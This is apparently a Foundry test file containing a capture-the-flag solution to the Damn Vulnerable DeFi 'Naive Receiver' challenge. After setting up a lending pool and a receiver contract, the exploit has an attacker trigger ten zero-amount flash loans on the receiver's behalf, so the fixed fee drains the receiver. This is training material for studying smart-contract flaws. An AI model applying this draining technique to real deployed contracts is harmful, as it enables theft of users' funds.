// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Utilities} from "./utils/Utilities.sol";
import "dvd-v3/naive-receiver/NaiveReceiverLenderPool.sol";
import "dvd-v3/naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECIEVER = 10e18;

    address payable internal deployer;
    address payable internal attacker;
    address payable internal someUser;

    address internal ETH;

    NaiveReceiverLenderPool internal nrlp;
    FlashLoanReceiver internal flr;

    function setUp() public {
        ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        vm.label(ETH, "ETH");

        Utilities utils = new Utilities();
        deployer = utils.getActor("Deployer", ETHER_IN_POOL);
        attacker = utils.getActor("Attacker", 1e18);
        someUser = utils.getActor("someUser", ETHER_IN_RECIEVER);

        vm.startPrank(deployer);
        nrlp = new NaiveReceiverLenderPool();
        vm.label(address(nrlp), "Pool");
        (bool sent,) = payable(nrlp).call{value: ETHER_IN_POOL}("");
        require(sent, "Failed to send Ether");
        vm.stopPrank();

        assertEq(address(nrlp).balance, ETHER_IN_POOL);
        assertEq(nrlp.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(nrlp.flashFee(ETH, 0), 1e18);

        vm.startPrank(someUser);
        flr = new FlashLoanReceiver(address(nrlp));
        vm.label(address(flr), "Receiver");
        (bool sent1,) = payable(flr).call{value: ETHER_IN_RECIEVER}("");
        require(sent1, "Failed to send Ether");
        vm.stopPrank();

        assertEq(address(flr).balance, ETHER_IN_RECIEVER);
        vm.expectRevert();
        flr.onFlashLoan(address(deployer), ETH, ETHER_IN_RECIEVER, 1e18, "0x");
    }

    function test_StoryNaiveReceiver() public view {
        console2.log("A new FlashLoan contract has been deployed!");
        console2.log("The dev has funded the vault with 1000ETH");
        console2.log("You come across a naive receiver");
        console2.log("Drain the receiver");
    }

    function test_ExploitNaiveReceiever() public {
        // flr does not check that flashloan is for more than 0
        // call flashloan 10 times with 0 as entry and the receiver will be empty due to the fee
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 10; i++) {
            nrlp.flashLoan(flr, ETH, 0, "");
        }
        vm.stopPrank();

        // validation
        assertEq(address(flr).balance, 0);
        assertEq(address(nrlp).balance,ETHER_IN_POOL + ETHER_IN_RECIEVER);
        console2.log("Challenge complete!!");
        console2.log("Move on to side-entrance");
    }
}
